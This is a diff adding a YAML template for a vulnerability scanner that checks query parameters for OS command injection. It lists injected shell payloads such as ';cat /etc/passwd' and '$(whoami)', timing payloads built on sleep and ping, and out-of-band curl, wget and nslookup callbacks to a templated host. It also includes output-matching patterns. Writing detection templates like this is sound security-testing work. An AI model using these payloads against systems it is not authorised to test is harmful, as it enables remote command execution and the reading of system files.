@@ -1,0 +1,63 @@
+id: cmdi
+info:
+  name: "OS Command Injection"
+  severity: high
+  description: "Detects command injection via timing, error patterns, and OOB callbacks"
+  tags: [cmdi, injection, rce]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - ";id"
+  - "|id"
+  - "||id"
+  - "&&id"
+  - "`id`"
+  - "$(id)"
+  - ";ls"
+  - "|ls"
+  - ";cat /etc/passwd"
+  - "|cat /etc/passwd"
+  - "&dir"
+  - "|dir"
+  - ";whoami"
+  - "|whoami"
+  - "$(whoami)"
+
+matchers:
+  body_patterns:
+    - "uid=[0-9]+.*gid=[0-9]+"
+    - "root:.*:0:0:"
+    - "(?i)Volume Serial Number"
+    - "(?i)Directory of"
+    - "(?i)bin/(bash|sh|zsh)"
+    - "(?i)command not found"
+    - "(?i)sh: [0-9]+:"
+    - "(?i)is not recognized as an internal"
+
+time_payloads:
+  delay_seconds: 3
+  payloads:
+    - ";sleep 3"
+    - "|sleep 3"
+    - "||sleep 3"
+    - "&&sleep 3"
+    - "`sleep 3`"
+    - "$(sleep 3)"
+    - ";ping -c 4 127.0.0.1"
+    - "|ping -n 4 127.0.0.1"
+    - ";timeout 3"
+
+oob_payloads:
+  - ";curl {{OOB_URL}}"
+  - "|curl {{OOB_URL}}"
+  - "$(curl {{OOB_URL}})"
+  - "`curl {{OOB_URL}}`"
+  - ";wget {{OOB_URL}}"
+  - "|wget {{OOB_URL}}"
+  - ";nslookup {{OOB_DOMAIN}}"
+  - "|nslookup {{OOB_DOMAIN}}"
+  - "$(nslookup {{OOB_DOMAIN}})"
+  - ";ping -c 1 {{OOB_DOMAIN}}"
